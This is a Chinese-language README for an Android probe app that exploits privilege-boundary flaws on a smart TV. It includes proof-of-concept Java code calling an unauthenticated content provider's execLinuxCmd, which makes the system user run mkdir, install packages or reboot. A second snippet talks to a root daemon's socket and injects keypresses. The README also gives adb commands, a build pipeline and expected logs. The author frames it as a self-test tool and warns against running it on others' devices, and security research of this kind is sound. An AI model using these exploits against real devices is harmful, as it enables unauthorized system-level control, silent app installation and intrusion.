# sysprobe —— 专门用来验证「权限边界」的探针 App

`com.dsh.sysprobe`，**13 KB**，零依赖、无权限、装在 `/data/app`。它不做任何持久化，
就干一件事：**从普通应用的身份，去调那些本该只有系统能调的东西，然后把结果打在屏幕上 + logcat 里。**

如果你问的是「有没有一个专门的 App 去拿权限」——就是它。但它拿不到 root，
它证明的是「**这台机器不需要 root 就能让 system 帮忙干活**」。

| 项 | 值 |
|---|---|
| 包名 | `com.dsh.sysprobe` |
| 大小 | `sysprobe.apk` 12,683 B（源码编译后） |
| 权限 | **一个都没申请**（manifest 里没有 `<uses-permission>`） |
| 身份 | `uid=10xxx`（普通三方应用），装在 `/data/app` |
| 依赖 | 只有 framework，无第三方库 |

---

## 它测两条链

### ① V1 — `com.tianci.provider` 的 `execLinuxCmd`

```java
Uri URI = Uri.parse("content://com.tianci.provider");

Bundle data = new Bundle();
data.putInt("cmd", 6);                        // 6=mkdir 5=reboot 2=pm install
data.putString("param", "/data/system/poc");

Bundle wrap = new Bundle();
wrap.putParcelable("param", data);
wrap.putBoolean("method_set", true);

Bundle res = getContentResolver().call(URI, "COMMON", "execLinuxCmd", wrap);
// 期望：res = {"ret": true}，且没有 SecurityException
```

`ret=true` 只代表**请求被受理**，不代表命令执行成功——这点很重要，
判断「到底是谁在跑」要看产物属主（`system:system` 就说明确实是 system 在跑，不是 shell）。

### ② V4 — `/data/socketsys/sys_info`（root 进程的 socket）

```java
LocalSocket ls = new LocalSocket();
ls.connect(new LocalSocketAddress("/data/socketsys/sys_info",
        LocalSocketAddress.Namespace.FILESYSTEM));
OutputStream os = ls.getOutputStream();
InputStream  is = ls.getInputStream();
os.write("get:gamemode\n".getBytes());     // 另有 set:keycode:<code> 注入按键
os.flush();
byte[] buf = new byte[4096];
int n = is.read(buf);                       // 期望：gamemode:{0}
```

---

## 怎么跑

两种入口：点图标直接跑默认参数（`cmd=6`，`mkdir /data/local/tmp/probe_<时间戳>`），或者用 `am` 传参：

```bash
# 装
adb install -r tools/sysprobe/sysprobe.apk

# V1：让 system 去 mkdir（挑 system 可写的目录才看得到效果）
adb shell am start -n com.dsh.sysprobe/.MainActivity \
  --ei cmdIndex 6 --es cmdParam /data/system/poc

# V1：让 system 去装包（cmd=2）
adb shell am start -n com.dsh.sysprobe/.MainActivity \
  --ei cmdIndex 2 --es cmdParam /data/local/tmp/anything.apk

# V4：读 root 进程状态
adb shell am start -n com.dsh.sysprobe/.MainActivity --es sock get:gamemode

# 看结果
adb logcat -s SYSPROBE
```

期望日志（2026-10-21/22 实测）：

```
I SYSPROBE: uid=10048
I SYSPROBE: cmd=6 param=/data/system/poc
I SYSPROBE: call(COMMON, execLinuxCmd, wrap)
I SYSPROBE: RESULT: Bundle[{ret=true}]
I SYSPROBE:   ret = true
```

```
I SYSPROBE: SOCK RECV(13): gamemode:{0}
```

---

## 从源码重新编译（不用 Gradle）

系统里没有 Android Studio 也能出包，只要 build-tools：

```bash
BT=$ANDROID_HOME/build-tools/34.0.0
JAR=$ANDROID_HOME/platforms/android-28/android.jar

# 1) 资源 + manifest
$BT/aapt2 compile --dir res -o res.zip                  # 本探针没有 res，可跳过
$BT/aapt2 link -o base.apk -I $JAR --manifest AndroidManifest.xml \
    --min-sdk-version 28 --target-sdk-version 28

# 2) 编译 java → dex
javac -source 8 -target 8 -bootclasspath $JAR -d classes \
    src/com/dsh/sysprobe/MainActivity.java
$BT/d8 --lib $JAR --min-api 28 --output . classes/com/dsh/sysprobe/*.class

# 3) 打进 apk + 对齐 + 签名
cd base && unzip -o ../base.apk >/dev/null && cp ../classes.dex . && cd ..
zip -j base.apk classes.dex
$BT/zipalign -f 4 base.apk aligned.apk
$BT/apksigner sign --ks my.jks --out sysprobe.apk aligned.apk
```

> 从 **Android 11 起** `d8` 需要 `--release` 并显式给 `--lib`；Android 9 上不签名的包会被拒装，
> 所以还要 `apksigner`，并且目标机 `persist.sys.disable.install.verify=1` 时安装无需点确认（V6）。

---

## 它的价值与边界

| 能做到 | 做不到 |
|---|---|
| 证明 provider 无鉴权（V1） | 拿 root / 改 `/system` |
| 让 system 帮它 `mkdir` / `pm install` / `reboot` | 执行任意命令（`cmds[]` 里只有这 3 条非空） |
| 和 root 守护进程对话、注入按键（V4） | 持久化（它自己什么都不写） |

持久化那一环（V2 造 `/data/ccos/customStart`）靠的是 shell 的 `ln -sf`，不是这个 App。
具体见 [PRIVILEGE-AND-TAKEOVER.md](../../PRIVILEGE-AND-TAKEOVER.md)。

---

## 提醒

这个 APK 是**只该装在我自己电视上**的探针：

- 它在任何一台机器上都不会自动提权，只会把「对方到底给不给普通应用这些能力」打出来；
- 但**不要**把它丢到别人的设备上跑——那是入侵，不是测试；
- 厂商修好 V1/V4 之后，它会正常地返回 `SecurityException` / 连接被拒，那时候它就成了一个「检查是否已修复」的小工具。
